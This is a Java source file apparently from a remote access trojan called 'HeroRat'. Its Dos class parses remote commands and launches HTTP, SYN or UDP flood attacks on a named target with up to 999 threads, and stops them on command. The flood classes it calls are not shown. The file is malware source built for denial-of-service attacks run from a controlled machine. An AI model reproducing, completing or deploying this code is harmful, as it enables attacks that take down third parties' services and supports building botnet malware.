package net.herorat.features.dos;

import java.io.DataOutputStream;

public class Dos implements DosInterface
{
	private static DosInterface dos = null;
	
	public static void handle(String[] args, DataOutputStream outputstream)
	{
		if (args.length == 3 && args[0].equals("http"))
		{
			int threads = Integer.parseInt(args[2]);
			dos = new DosHttp(args[1], threads > 999 ? 999 : threads);
			dos.start();
		}
		else if (args.length == 4 && args[0].equals("syn"))
		{
			int threads = Integer.parseInt(args[2]);
			dos = new DosSyn(args[1], threads > 999 ? 999 : threads, Integer.parseInt(args[3]));
			dos.start();
		}
		else if (args.length == 3 && args[0].equals("udp"))
		{
			int threads = Integer.parseInt(args[2]);
			dos = new DosUdp(args[1], threads > 999 ? 999 : threads);
			dos.start();
		}
		else if (args.length == 1 && args[0].equals("stop") && dos != null)
		{
			dos.stop();
		}
	}

	@Override
	public void start() {}

	@Override
	public void stop() {}
}